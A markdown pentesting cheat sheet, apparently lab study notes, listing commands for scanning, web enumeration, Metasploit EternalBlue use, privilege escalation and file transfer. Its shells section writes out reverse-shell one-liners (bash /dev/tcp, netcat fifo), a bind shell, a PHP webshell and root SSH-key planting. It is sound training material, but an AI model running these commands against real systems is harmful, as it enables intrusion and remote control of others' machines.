# 🛠️ Basic Pentesting Cheat Sheet

## 🔧 General

| Command | Description |
|--------|-------------|
| `sudo openvpn user.ovpn` | Connect to VPN |
| `ifconfig` / `ip a` | Show IP address |
| `netstat -rn` | Show networks accessible via the VPN |
| `ssh user@10.10.10.10` | SSH to a remote server |
| `ftp 10.129.42.253` | FTP to a remote server |

---

## 🧩 Tmux

| Command | Description |
|--------|-------------|
| `tmux` | Start tmux |
| `ctrl+b` | Default tmux prefix |
| `prefix c` | New window |
| `prefix 1` | Switch to window 1 |
| `prefix Shift+%` | Split pane vertically |
| `prefix Shift+"` | Split pane horizontally |
| `prefix →` | Switch to right pane |

---

## ✍️ Vim Basics

| Command | Description |
|--------|-------------|
| `vim file` | Open file with vim |
| `esc + i` | Enter insert mode |
| `esc` | Back to normal mode |
| `x` | Cut character |
| `dw` | Cut word |
| `dd` | Cut line |
| `yw` | Copy word |
| `yy` | Copy line |
| `p` | Paste |
| `:1` | Go to line 1 |
| `:w` | Save file |
| `:q` | Quit |
| `:q!` | Quit without saving |
| `:wq` | Save and quit |

---

## 🔍 Service Scanning

| Command | Description |
|--------|-------------|
| `nmap 10.129.42.253` | Basic scan |
| `nmap -sV -sC -p- 10.129.42.253` | Version/script scan |
| `locate scripts/citrix` | List nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run SMB nmap script |
| `netcat 10.10.10.10 22` | Grab banner |
| `smbclient -N -L \\\\10.129.42.253` | List SMB shares |
| `smbclient \\\\10.129.42.253\\users` | Connect to SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP |

---

## 🌐 Web Enumeration

| Command | Description |
|--------|-------------|
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Directory scan |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Subdomain scan |
| `curl -IL https://www.inlanefreight.com` | Grab headers |
| `whatweb 10.10.10.121` | Webserver info |
| `curl 10.10.10.121/robots.txt` | Check robots.txt |
| `Ctrl + U` | View page source |

---

## 💣 Public Exploits

| Command | Description |
|--------|-------------|
| `searchsploit openssh 7.2` | Search public exploits |
| `msfconsole` | Start Metasploit |
| `search exploit eternalblue` | Search MSF exploits |
| `use exploit/windows/smb/ms17_010_psexec` | Use exploit module |
| `show options` | Show module options |
| `set RHOSTS 10.10.10.40` | Set remote host |
| `check` | Check vulnerability |
| `exploit` | Launch exploit |

---

## 🐚 Using Shells

| Command | Description |
|--------|-------------|
| `nc -lvnp 1234` | Start listener |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Reverse shell |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f` | Reverse shell (fifo method) |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f` | Start bind shell |
| `nc 10.10.10.1 1234` | Connect to bind shell |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (method 1) |
| `Ctrl+Z`, `stty raw -echo`, `fg`, then double Enter | Upgrade shell TTY (method 2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create PHP webshell |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute command in webshell |

---

## 🔼 Privilege Escalation

| Command | Description |
|--------|-------------|
| `./linpeas.sh` | Run LinPEAS |
| `sudo -l` | List sudo privileges |
| `sudo -u user /bin/echo Hello World!` | Run command as another user |
| `sudo su -` | Switch to root |
| `sudo su user -` | Switch to another user |
| `ssh-keygen -f key` | Create SSH key |
| `echo "ssh-rsa AAAA... user@parrot" >> /root/.ssh/authorized_keys` | Add SSH key |
| `ssh root@10.10.10.10 -i key` | SSH using private key |

---

## 📁 Transferring Files

| Command | Description |
|--------|-------------|
| `python3 -m http.server 8000` | Start local webserver |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download via wget |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download via curl |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer via SCP |
| `base64 shell -w 0` | Encode file in base64 |
| `md5sum shell` | Check file integrity |

#

 `echo f0VMR... | base64 -d > shell` | Decode from base64 |
